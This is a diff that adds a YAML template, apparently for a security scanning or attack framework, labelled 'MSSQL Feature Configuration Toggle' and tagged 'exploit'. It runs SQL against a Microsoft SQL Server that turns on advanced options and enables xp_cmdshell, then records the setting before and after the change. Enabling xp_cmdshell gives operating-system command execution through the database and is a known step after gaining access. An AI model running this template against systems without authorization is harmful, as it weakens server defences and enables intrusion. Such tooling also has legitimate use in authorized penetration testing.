@@ -1,0 +1,32 @@
+id: mssql-config-toggle
+service: [mssql]
+variables:
+  feature: xp_cmdshell
+  enable: 1
+info:
+  name: MSSQL Feature Configuration Toggle
+  severity: high
+  tags: mssql,exploit,config
+
+services:
+  - ops:
+      - db: "SELECT 'current=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = '{{feature}}'"
+        name: current_state
+    extractors:
+      - type: regex
+        name: mssql_config_previous
+        part: current_state
+        regex: ['(?m)^current=([01])']
+        group: 1
+
+  - ops:
+      - db: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE"
+      - db: "EXEC sp_configure '{{feature}}', {{enable}}; RECONFIGURE"
+      - db: "SELECT 'new=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = '{{feature}}'"
+        name: new_state
+    extractors:
+      - type: regex
+        name: mssql_config_new
+        part: new_state
+        regex: ['(?m)^new=([01])']
+        group: 1
